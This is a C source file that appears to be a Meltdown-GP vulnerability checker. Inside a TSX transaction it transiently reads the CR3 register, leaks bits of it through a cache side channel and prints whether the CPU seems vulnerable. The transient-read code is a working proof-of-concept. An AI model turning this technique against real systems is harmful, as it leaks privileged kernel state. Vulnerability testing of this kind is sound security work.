#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>

#include "libcache/cache.h"
#include "lib/global.h"

void main(int argc, char **argv)
{
    PREPARE();
    printf("Meltdown_GP Begins...\n");
    
    // print CR3 register content
    // int temp = system("sudo insmod ../../libcr3/kernel_module.ko");
    // pid_t pid = getpid();
    pid_t pid = 1;
    char pid_s[64];
    // get CR3 register for running process
    sprintf(pid_s, "echo %zd > /proc/cr3; cat /proc/cr3", (size_t)pid);
    // sprintf(pid_s, "echo %zd > /proc/cr3", (size_t)pid);
    printf("CR3: ");
    fflush(stdout);
    int temp = system(pid_s);
    // Flush our shared memory
    flush_shared_memory();
    int result = 0;
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        // Start TSX
        if (try_start())
        {
            // Null pointer access prolongs transient window
            maccess(0);
            // Encode content of the CR3 register in the cache
            // 将mem放入ebx，保护rax，将cr3写入rax，和0xff000与放入rax，访问mem+rax的内存(得到cr3的中间两位)
            asm volatile(
                "movq %%cr3, %%rax\n"
                "andq $0xff000, %%rax\n"
                "movq (%%rbx,%%rax,1), %%rbx\n"
                :
                : "b"(mem)
                : "rax");
            try_abort();
        }
        try_end();

        // Recover data from the cache
        result = cache_decode();
        if (result != 0)
        {
            passed_count++;
            if (passed_count <= 10)
            {
                printf("%x ", result);
            }
        }
        // printf("%x", cache_decode());
    }

    // temp = system("sudo rmmod ../../libcr3/kernel_module.ko");
    if (passed_count > 0)
    {
        printf("\nPlease check whether the output is equal to CR3[4:3] manually!\n");
    }
    
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_GP: Perhaps Vulnerable\n" ANSI_COLOR_RESET);
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_GP: Not Vulnerable\n" ANSI_COLOR_RESET);
    }
    printf("Meltdown_GP done!\n\n");
}
